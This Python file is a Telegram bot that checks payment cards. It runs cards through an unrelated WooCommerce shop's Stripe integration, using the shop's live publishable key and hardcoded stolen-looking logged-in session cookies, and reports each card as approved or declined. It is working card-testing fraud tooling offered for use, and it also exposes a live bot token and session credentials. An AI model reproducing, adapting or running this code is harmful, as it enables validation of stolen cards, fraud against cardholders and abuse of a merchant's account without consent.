"""
Stripe Payment Method Checker - Telegram Bot
Polling mode for Render free tier (no webhook needed)
"""

import os
import requests
import uuid
import time
import json
import re
import threading
from typing import Optional, Dict, Any
from flask import Flask

# ============== CONFIGURATION ==============
BOT_TOKEN = "7950514269:AAElXX262n31xiSn1pCxthxhuMpjw9VjtVg"

# Site Configuration
SITE_URL = "https://infiniteautowerks.com"
PUBLISHABLE_KEY = "pk_live_51MwcfkEreweRX4nmunyHnVjt6qSmKUgaafB7msRfg4EsQrStC8l0FlevFiuf2vMpN7oV9B5PGmIc7uNv1tdnvnTv005ZJCfrCk"
COOKIES = """wordpress_sec_e7182569f4777e7cdbb9899fb576f3eb=hbjgyhtfr%7C1768803658%7CYqxUeXNjAKwu20bDX2VG2kndYvX3RbKMYY5BIzFEdCl%7C14873263ec0ace12b4c8926c1472fb012761f36b0d1dcfe2e7df480516bed7b5; wordpress_logged_in_e7182569f4777e7cdbb9899fb576f3eb=hbjgyhtfr%7C1768803658%7CYqxUeXNjAKwu20bDX2VG2kndYvX3RbKMYY5BIzFEdCl%7Ced82f62145a463255c68d252f811c3baaa30f700a9a0ec76d330611126f019de"""
POSTAL_CODE = "10001"
COUNTRY = "US"

COUNTRY_MAP = {
    'TH': 'Thailand', 'BR': 'Brazil', 'US': 'United States', 'IN': 'India',
    'GB': 'United Kingdom', 'CA': 'Canada', 'AU': 'Australia', 'DE': 'Germany',
    'FR': 'France', 'IT': 'Italy', 'ES': 'Spain', 'MX': 'Mexico', 'JP': 'Japan',
    'CN': 'China', 'KR': 'South Korea', 'RU': 'Russia', 'NL': 'Netherlands',
    'PH': 'Philippines', 'ID': 'Indonesia', 'MY': 'Malaysia', 'SG': 'Singapore',
    'VN': 'Vietnam', 'PK': 'Pakistan', 'BD': 'Bangladesh', 'NG': 'Nigeria',
    'ZA': 'South Africa', 'EG': 'Egypt', 'TR': 'Turkey', 'PL': 'Poland',
    'UA': 'Ukraine', 'AR': 'Argentina', 'CO': 'Colombia', 'CL': 'Chile',
    'PE': 'Peru', 'VE': 'Venezuela', 'SA': 'Saudi Arabia', 'AE': 'UAE',
    'IL': 'Israel', 'SE': 'Sweden', 'NO': 'Norway', 'DK': 'Denmark',
    'FI': 'Finland', 'BE': 'Belgium', 'AT': 'Austria', 'CH': 'Switzerland',
    'PT': 'Portugal', 'GR': 'Greece', 'CZ': 'Czech Republic', 'RO': 'Romania',
    'HU': 'Hungary', 'IE': 'Ireland', 'NZ': 'New Zealand', 'HK': 'Hong Kong',
    'TW': 'Taiwan', 'KE': 'Kenya', 'GH': 'Ghana', 'MA': 'Morocco'
}

app = Flask(__name__)


# ============== TELEGRAM API ==============
def send_message(chat_id, text, parse_mode=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text}
    if parse_mode:
        data["parse_mode"] = parse_mode
    return requests.post(url, json=data)

def edit_message(chat_id, message_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text}
    requests.post(url, json=data)

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 30}
    if offset:
        params["offset"] = offset
    try:
        resp = requests.get(url, params=params, timeout=35)
        return resp.json().get("result", [])
    except:
        return []


# ============== STRIPE AUTOMATION ==============
class StripeWooCommerceAutomation:
    def __init__(self, site_url, cookies=None, publishable_key=None):
        self.site_url = site_url.rstrip('/')
        self.cookies = cookies
        self.publishable_key = publishable_key
        self.session = requests.Session()
        if cookies:
            for item in cookies.split('; '):
                if '=' in item:
                    k, v = item.split('=', 1)
                    self.session.cookies.set(k, v)
    
    def _gen_ids(self):
        return {
            'guid': str(uuid.uuid4()).replace('-', '')[:32],
            'muid': str(uuid.uuid4()).replace('-', '')[:32],
            'sid': str(uuid.uuid4()).replace('-', '')[:32],
            'client_session_id': str(uuid.uuid4()),
        }
    
    def fetch_nonce(self):
        try:
            resp = self.session.get(f"{self.site_url}/my-account/add-payment-method/", timeout=30)
            for p in [r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]+)"', r'_ajax_nonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']']:
                m = re.search(p, resp.text)
                if m: return m.group(1)
        except: pass
        return None
    
    def create_pm(self, num, month, year, cvc, zip_code, country="US"):
        ids = self._gen_ids()
        data = {
            'type': 'card', 'card[number]': num.replace(' ','').replace('-',''),
            'card[cvc]': cvc, 'card[exp_year]': year, 'card[exp_month]': month,
            'billing_details[address][postal_code]': zip_code, 'billing_details[address][country]': country,
            'payment_user_agent': 'stripe.js/066093a970; stripe-js-v3/066093a970; payment-element; deferred-intent',
            'referrer': self.site_url, 'client_attribution_metadata[client_session_id]': ids['client_session_id'],
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'guid': ids['guid'], 'muid': ids['muid'], 'sid': ids['sid'],
            'key': self.publishable_key, '_stripe_version': '2024-06-20'
        }
        try:
            r = requests.post("https://api.stripe.com/v1/payment_methods", data=data, 
                headers={'content-type':'application/x-www-form-urlencoded','origin':'https://js.stripe.com'}, timeout=30)
            res = r.json()
            card = res.get('card',{})
            return {'ok': 'id' in res, 'id': res.get('id'), 'brand': card.get('brand','').upper(), 
                    'funding': card.get('funding','').upper(), 'country': card.get('country'), 'res': res}
        except Exception as e:
            return {'ok': False, 'error': str(e), 'res': {}}
    
    def confirm(self, pm_id, nonce):
        try:
            r = self.session.post(f"{self.site_url}/wp-admin/admin-ajax.php", 
                data={'action':'wc_stripe_create_and_confirm_setup_intent','wc-stripe-payment-method':pm_id,
                      'wc-stripe-payment-type':'card','_ajax_nonce':nonce},
                headers={'x-requested-with':'XMLHttpRequest'}, timeout=30)
            res = r.json()
            return {'ok': res.get('success')==True, 'error': res.get('data',{}).get('error',{}).get('message')}
        except Exception as e:
            return {'ok': False, 'error': str(e)}
    
    def check(self, num, month, year, cvc, zip_code, country="US"):
        pm = self.create_pm(num, month, year, cvc, zip_code, country)
        if not pm['ok']:
            return {'ok': False, 'error': pm.get('res',{}).get('error',{}).get('message','Failed'), 'pm': pm}
        nonce = self.fetch_nonce()
        if not nonce:
            return {'ok': False, 'error': 'No nonce found', 'pm': pm}
        conf = self.confirm(pm['id'], nonce)
        return {'ok': conf['ok'], 'error': conf.get('error'), 'pm': pm}


# ============== CARD CHECKER ==============
def check_card(card_str):
    parts = card_str.strip().split('|')
    if len(parts) != 4:
        return "❌ Format: NUMBER|MM|YYYY|CVC"
    num, month, year, cvc = [p.strip() for p in parts]
    if len(year) == 4: year = year[-2:]
    
    auto = StripeWooCommerceAutomation(SITE_URL, COOKIES, PUBLISHABLE_KEY)
    r = auto.check(num, month.zfill(2), year, cvc, POSTAL_CODE, COUNTRY)
    
    pm = r.get('pm', {})
    brand, funding = pm.get('brand','?'), pm.get('funding','?')
    cc = pm.get('country','')
    country = COUNTRY_MAP.get(cc, cc or '?')
    
    yr = f"20{year}" if len(year)==2 else year
    card = f"{num}|{month.zfill(2)}|{yr}|{cvc}"
    
    status = "🌠 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅" if r['ok'] else "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌"
    out = f"\n{status}\n\n𝗖𝗮𝗿𝗱: {card}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth\n𝐈𝐧𝐟𝐨: {brand} - {funding}\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {cc}\n𝐎𝐰𝐧𝐞𝐫: @llegaccy\n"
    if not r['ok']: out += f"𝐄𝐫𝐫𝐨𝐫: {r.get('error','Unknown')}\n"
    return out


# ============== BOT HANDLERS ==============
def handle_msg(chat_id, text):
    if text.startswith('/start'):
        send_message(chat_id, "🔥 *Stripe Checker Bot*\n\n⚡ Use /cmd for commands\n👤 @llegaccy", "Markdown")
    elif text.startswith('/cmd'):
        send_message(chat_id, "📋 *Commands*\n\n/start - Welcome\n/cum <card> - Check\n\n`/cum 4111111111111111|12|2025|123`", "Markdown")
    elif text.startswith('/cum'):
        card = text.replace('/cum','').strip()
        if not card:
            send_message(chat_id, "❌ /cum NUMBER|MM|YYYY|CVC")
            return
        resp = send_message(chat_id, "⏳ Checking...")
        msg_id = resp.json().get("result",{}).get("message_id")
        result = check_card(card)
        if msg_id: edit_message(chat_id, msg_id, result)
        else: send_message(chat_id, result)


# ============== POLLING (background thread) ==============
def polling_loop():
    print("🤖 Polling started...")
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
    offset = None
    while True:
        try:
            updates = get_updates(offset)
            for u in updates:
                offset = u['update_id'] + 1
                msg = u.get('message',{})
                chat_id = msg.get('chat',{}).get('id')
                text = msg.get('text','')
                if chat_id and text:
                    print(f"[MSG] {text}")
                    handle_msg(chat_id, text)
        except Exception as e:
            print(f"[ERR] {e}")
            time.sleep(5)


# Start polling in background thread
threading.Thread(target=polling_loop, daemon=True).start()


# ============== FLASK (keeps Render alive) ==============
@app.route('/')
def home():
    return "🤖 Bot Running!"

@app.route('/ping')
def ping():
    return "pong"


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
